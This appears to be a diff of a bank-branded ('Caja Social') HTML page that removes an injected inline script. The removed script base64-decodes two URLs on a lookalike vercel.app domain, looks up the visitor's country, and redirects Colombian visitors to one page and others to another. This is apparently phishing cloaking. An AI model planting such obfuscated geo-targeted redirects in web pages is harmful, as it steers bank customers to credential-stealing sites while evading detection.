@@ -9,26 +9,6 @@
 <meta name="author" content="Caja Social">
 <meta name="robots" content="index, follow">
 
-
- <script>
-(function(){
-  const URL_CO  = atob("aHR0cHM6Ly90dWNhamFzb2NpYWxvZmljaW5hLnZlcmNlbC5hcHAvaW5pY2lvLmh0bWw=");
-  const URL_OUT = atob("aHR0cHM6Ly90dWNhamFzb2NpYWxvZmljaW5hLnZlcmNlbC5hcHAvaS5odG1s");
-
-  fetch("https://ipapi.co/json/")
-    .then(r => r.json())
-    .then(d => {
-      if (d.country === "CO") {
-        window.location.href = URL_CO;
-      } else {
-        window.location.href = URL_OUT;
-      }
-    })
-    .catch(() => {
-      window.location.href = URL_OUT;
-    });
-})();
-</script>
 <style>
 *{
     margin:0;
